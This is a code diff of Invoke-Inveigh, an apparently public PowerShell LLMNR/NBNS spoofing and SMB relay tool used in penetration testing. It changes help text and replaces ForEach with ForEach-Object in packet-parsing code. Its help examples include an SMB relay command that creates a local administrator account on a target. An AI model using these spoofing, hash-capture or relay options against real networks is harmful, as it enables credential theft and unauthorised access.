@@ -16,7 +16,7 @@ Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with the following fea
     Run time control
 
 .PARAMETER IP
-Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the 'SpooferIP' parameter is not set.
+Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the SpooferIP parameter is not set.
 
 .PARAMETER SpooferIP
 Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh host. 
@@ -74,7 +74,7 @@ Specify a filename within the HTTPDir to serve as the default HTTP/HTTPS respons
 Specify an EXE filename within the HTTPDir to serve as the default HTTP/HTTPS response for EXE requests. 
 
 .PARAMETER HTTPResponse
-Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests.
+Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests. Use PowerShell character escapes where necessary.
 
 .PARAMETER HTTPSCertAppID
 Specify a valid application GUID for use with the ceriticate.
@@ -95,7 +95,7 @@ Specify a proxy server port to be included in a basic wpad.dat response for WPAD
 Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy.
 
 .PARAMETER WPADResponse
-Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort are set.
+Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort are set. Use PowerShell character escapes where necessary.
 
 .PARAMETER SMB
 Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.
@@ -169,6 +169,7 @@ Execute specifying a specific local listening/spoofing IP and disabling HTTP cha
 Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76
 Execute with the stealthiest options.
 
+.EXAMPLE
 Invoke-Inveigh -Inspect
 Execute with LLMNR, NBNS, SMB, HTTP, and HTTPS disabled in order to only inpect LLMNR/NBNS traffic.
 
@@ -185,7 +186,7 @@ Invoke-Inveigh -HTTPResponse '<html><head><meta http-equiv="refresh" content="0;
 Execute specifying an HTTP redirect response.
 
 .EXAMPLE
-Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Winter2016 /add && net localgroup administrators Dave /add"
+Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
 Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  
 
 .NOTES
@@ -725,7 +726,7 @@ $shared_basic_functions_scriptblock =
 
         $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
         $string_data = $string_data -replace "-00",""
-        $string_data = $string_data.Split("-") | ForEach{ [CHAR][CONVERT]::toint16($_,16)}
+        $string_data = $string_data.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
         return $string_extract
     }
@@ -838,19 +839,19 @@ $HTTP_scriptblock =
         $HTTP_timestamp = Get-Date
         $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
         $HTTP_timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_timestamp))
-        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach{ [CHAR][CONVERT]::toint16($_,16)}
+        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
 
         if($inveigh.challenge)
         {
             $HTTP_challenge = $inveigh.challenge
             $HTTP_challenge_bytes = $inveigh.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
-            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach{ [CHAR][CONVERT]::toint16($_,16)}
+            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         }
         else
         {
             $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
             $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
-            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach{ [CHAR][CONVERT]::toint16($_,16)}
+            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         }
 
         $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge) |Out-Null
@@ -1264,7 +1265,7 @@ $sniffer_scriptblock =
 
                             $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
                             $NBNS_query = $NBNS_query -replace "-00",""
-                            $NBNS_query = $NBNS_query.Split("-") | ForEach{ [CHAR][CONVERT]::toint16($_,16)}
+                            $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                             $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                             $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                         
@@ -1360,7 +1361,7 @@ $sniffer_scriptblock =
      
                             $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
                             $LLMNR_query = $LLMNR_query -replace "-00",""
-                            $LLMNR_query = $LLMNR_query.Split("-") | ForEach{ [CHAR][CONVERT]::toint16($_,16)}
+                            $LLMNR_query = $LLMNR_query.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                             $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
                 
                             if($LLMNR -eq 'y')
